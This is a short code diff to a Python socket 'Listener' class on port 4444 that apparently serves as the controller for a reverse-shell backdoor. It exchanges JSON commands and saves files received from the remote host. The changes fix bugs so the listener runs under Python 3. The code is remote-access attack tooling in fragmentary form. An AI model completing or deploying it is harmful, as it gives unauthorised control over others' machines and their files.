@@ -5,7 +5,7 @@ import json
 #import subprocess
 import base64
 
-Ip_Adress = "Your_IP"
+Ip_Adress = "192.168.1.X"
 Port = 4444
 
 class Listener:
@@ -20,13 +20,13 @@ class Listener:
 
      def reliable_send(self, data):
           json_data = json.dumps(data)
-          self.connection.send(json_data)
+          self.connection.send(json_data.encode())
 
      def reliable_receive(self):
           json_data = ""
-          while Ture:
+          while True:
                try:
-                    json_data = json_data + self.connection.recv(1024)
+                    json_data = json_data + self.connection.recv(1024).decode()
                     return json.loads(json_data)
                except ValueError:
                     continue
@@ -38,7 +38,7 @@ class Listener:
                self.connection.close()
                exit()
                        
-          return self.reliable_receive(1024)
+          return self.reliable_receive()
 
      def write_file(self, path, content):
           with open(path, "wb") as file: # change to wb to w if need!
